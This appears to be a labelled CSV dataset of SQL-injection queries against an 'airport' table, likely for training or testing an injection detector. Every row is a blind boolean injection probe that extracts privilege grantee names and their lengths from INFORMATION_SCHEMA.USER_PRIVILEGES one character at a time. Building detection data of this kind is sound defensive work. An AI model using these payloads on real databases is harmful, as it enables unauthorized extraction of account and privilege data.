full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),20,1))>39-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),21,1))>104-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>64-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),22,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),21,1))>108-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),20,1))>37-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),20,1))>38-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),22,1))>104-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),21,1))>106-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),22,1))>108-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),24,1))>64-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),21,1))>107-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),22,1))>110-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),24,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),25,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>104-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),22,1))>111-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),24,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),25,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>100-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),26,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),25,1))>104-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),24,1))>104-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),26,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),25,1))>108-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>98-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),26,1))>104-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),23,1))>99-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),24,1))>100-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),25,1))>106-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),26,1))>100-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),25,1))>107-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),24,1))>98-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),26,1))>102-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),27,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),28,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),26,1))>103-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),28,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),27,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),24,1))>97-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),29,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),28,1))>120-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),29,1))>112-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),27,1))>104-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),27,1))>108-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),29,1))>120-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),27,1))>110-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>96-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),28,1))>116-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),27,1))>111-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),29,1))>116-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>48-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),28,1))>114-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),28,1))>115-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),29,1))>114-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),29,1))>115-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>24-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>36-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>42-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>39-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>37-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),30,1))>38-- SWoZ';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>51-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>48-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>49-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>50-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>51-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>54-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>56-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>55-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>51-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>48-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>9-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>64-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>64-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>64-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>64-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>112-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>32-- kEUL';",1,airport-S1,Unknown,Unknown
